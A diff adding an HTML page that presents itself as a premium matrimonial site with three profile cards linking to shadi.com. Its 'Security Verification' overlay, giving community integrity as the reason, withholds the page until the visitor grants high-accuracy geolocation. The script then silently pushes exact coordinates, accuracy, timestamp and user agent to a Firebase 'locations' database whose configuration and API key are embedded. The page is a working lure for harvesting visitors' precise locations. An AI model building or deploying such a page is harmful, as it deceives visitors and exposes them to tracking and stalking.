@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Elite Matrimonial | Premium Matches</title>
+    
+    <!-- Firebase SDK (v8 compat) -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <style>
+        /* --- CSS STYLING --- */
+        :root {
+            --deep-navy: #0A1128;
+            --sunset-orange: #FF4500;
+            --electric-purple: #BF40BF;
+            --dark-overlay: rgba(10, 17, 40, 0.95);
+            --glass-bg: rgba(191, 64, 191, 0.05);
+            --glass-border: rgba(255, 69, 0, 0.3);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--deep-navy);
+            color: #e0e0e0;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Typography & Neon */
+        .neon-purple {
+            color: var(--electric-purple);
+            text-shadow: 0 0 10px var(--electric-purple), 0 0 20px var(--electric-purple);
+        }
+
+        .neon-orange {
+            color: var(--sunset-orange);
+            text-shadow: 0 0 10px var(--sunset-orange), 0 0 20px var(--sunset-orange);
+        }
+
+        .text-orange { color: var(--sunset-orange); }
+        .text-purple { color: var(--electric-purple); }
+
+        /* Glassmorphism Panel */
+        .glass-panel {
+            background: var(--glass-bg);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid var(--glass-border);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.8);
+            border-radius: 20px;
+        }
+
+        /* Blocker Overlay */
+        #location-blocker {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: var(--deep-navy);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease;
+        }
+
+        .blocker-content {
+            padding: 50px;
+            text-align: center;
+            max-width: 550px;
+            width: 90%;
+        }
+
+        #status-message {
+            margin-top: 20px;
+            font-size: 0.9rem;
+            color: #ff4d4d;
+            min-height: 1.2em;
+        }
+
+        /* Main Content UI */
+        #main-content {
+            padding: 40px 20px;
+            opacity: 1;
+            transition: opacity 0.8s ease;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 60px;
+        }
+
+        header h1 {
+            font-size: 3.5rem;
+            letter-spacing: 2px;
+        }
+
+        .profile-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 40px;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .profile-card {
+            text-decoration: none;
+            padding: 25px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .profile-card:hover {
+            transform: scale(1.05);
+            border-color: var(--electric-purple);
+            box-shadow: 0 0 30px rgba(191, 64, 191, 0.4);
+        }
+
+        .image-wrapper {
+            width: 100%;
+            height: 350px;
+            border-radius: 15px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .image-wrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: grayscale(30%) brightness(0.8);
+            transition: 0.4s ease;
+        }
+
+        .profile-card:hover .image-wrapper img {
+            filter: grayscale(0%) brightness(1.1);
+        }
+
+        /* Utilities */
+        .hidden { display: none !important; }
+        
+        /* Loading Animation */
+        .loader {
+            border: 3px solid transparent;
+            border-top: 3px solid var(--sunset-orange);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Access Gatekeeper -->
+    <div id="location-blocker">
+        <div class="blocker-content glass-panel">
+            <h2 class="neon-purple">Security Verification</h2>
+            <p style="margin-top: 15px;">To maintain the integrity of our community, please <span class="text-orange">Allow Location Access</span> to view profiles near you.</p>
+            <div id="loader-icon" class="loader"></div>
+            <p id="status-message">Awaiting browser permission...</p>
+        </div>
+    </div>
+
+    <!-- Main Content Area -->
+    <div id="main-content" class="hidden">
+        <header>
+            <h1 class="neon-orange">Premium Matches</h1>
+            <p class="text-purple">Verified profiles exclusively for you.</p>
+        </header>
+
+        <main class="profile-grid">
+            <!-- Profile 1 -->
+            <a href="https://www.shadi.com" target="_blank" class="profile-card glass-panel">
+                <div class="image-wrapper">
+                    <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=500&q=80" alt="User">
+                </div>
+                <h3 class="text-orange">Sara, 24</h3>
+                <p class="text-purple">UX Researcher • Karachi</p>
+            </a>
+
+            <!-- Profile 2 -->
+            <a href="https://www.shadi.com" target="_blank" class="profile-card glass-panel">
+                <div class="image-wrapper">
+                    <img src="https://images.unsplash.com/photo-1531123897727-8f129e16fd3c?auto=format&fit=crop&w=500&q=80" alt="User">
+                </div>
+                <h3 class="text-orange">Alizeh, 27</h3>
+                <p class="text-purple">Full Stack Developer • Lahore</p>
+            </a>
+
+            <!-- Profile 3 -->
+            <a href="https://www.shadi.com" target="_blank" class="profile-card glass-panel">
+                <div class="image-wrapper">
+                    <img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?auto=format&fit=crop&w=500&q=80" alt="User">
+                </div>
+                <h3 class="text-orange">Maya, 25</h3>
+                <p class="text-purple">Fashion Designer • Islamabad</p>
+            </a>
+        </main>
+    </div>
+
+    <script>
+        // --- FIREBASE CONFIGURATION ---
+        const firebaseConfig = {
+            apiKey: "AIzaSyDMy6--svGEXxLtwQ-ROJmtDQwKgnkKl0Y",
+            authDomain: "acthv-f0cd3.firebaseapp.com",
+            databaseURL: "https://acthv-f0cd3-default-rtdb.firebaseio.com",
+            projectId: "acthv-f0cd3",
+            storageBucket: "acthv-f0cd3.appspot.com",
+            messagingSenderId: "51412717184",
+            appId: "1:51412717184:web:f2e03ac5e86930ec23a065"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        const blocker = document.getElementById('location-blocker');
+        const mainContent = document.getElementById('main-content');
+        const statusMsg = document.getElementById('status-message');
+        const loader = document.getElementById('loader-icon');
+
+        function initLocationCheck() {
+            if ("geolocation" in navigator) {
+                // Requesting exact location with high accuracy
+                navigator.geolocation.getCurrentPosition(handleSuccess, handleError, {
+                    enableHighAccuracy: true,
+                    timeout: 15000,
+                    maximumAge: 0
+                });
+            } else {
+                statusMsg.innerText = "Error: Geolocation not supported by this browser.";
+                loader.style.display = "none";
+            }
+        }
+
+        function handleSuccess(position) {
+            const data = {
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
+                accuracy: position.coords.accuracy + " meters",
+                timestamp: new Date().toLocaleString(),
+                userAgent: navigator.userAgent
+            };
+
+            statusMsg.innerText = "Verifying location...";
+            statusMsg.style.color = "var(--sunset-orange)";
+
+            // Save to Firebase 'locations' folder
+            database.ref('locations').push(data)
+                .then(() => {
+                    // Success: Unlock the page
+                    blocker.style.opacity = "0";
+                    setTimeout(() => {
+                        blocker.classList.add('hidden');
+                        mainContent.classList.remove('hidden');
+                    }, 500);
+                })
+                .catch((err) => {
+                    statusMsg.innerText = "Database Error. Please refresh.";
+                    console.error(err);
+                });
+        }
+
+        function handleError(error) {
+            loader.style.display = "none";
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    statusMsg.innerText = "Access Denied. You must allow location to enter this site.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    statusMsg.innerText = "Location unavailable. Please check your GPS settings.";
+                    break;
+                case error.TIMEOUT:
+                    statusMsg.innerText = "Request timed out. Please refresh the page.";
+                    break;
+                default:
+                    statusMsg.innerText = "An unknown error occurred.";
+            }
+        }
+
+        // Start the process
+        window.onload = initLocationCheck;
+    </script>
+</body>
+</html>
